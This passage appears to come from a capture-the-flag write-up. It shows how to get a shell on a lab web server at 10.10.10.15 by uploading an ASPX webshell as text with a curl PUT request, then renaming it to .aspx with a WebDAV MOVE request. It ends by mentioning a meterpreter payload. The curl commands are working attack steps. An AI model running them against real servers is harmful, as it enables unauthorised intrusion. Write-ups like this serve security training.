Shell as network service Upload Webshell The first thing I’ll need to do is upload my webshell. Kali has a simple one at /usr/share/webshells/aspx/cmdasp.aspx . I’ll grab a copy: root@kali# cp /usr/share/webshells/aspx/cmdasp.aspx . Now I’ll upload that to target as a txt using curl and the http put method: root@kali# curl -X PUT http://10.10.10.15/0xdf.txt -d @cmdasp.aspx If I look at the page now, I’ll see the code, but it’s not executed, as the server is treating it as text: Move Webshell Now I’ll use the next webdav command, MOVE. Again, I can do this with curl: -X MOVE - use the MOVE method -H 'Destination:http://10.10.10.15/0xdf.aspx' - defines where to move to http://10.10.10.15/0xdf.txt - the file to move root@kali# curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt And it works: Meterpreter I’ll do the same thing with a meterpreter payload.
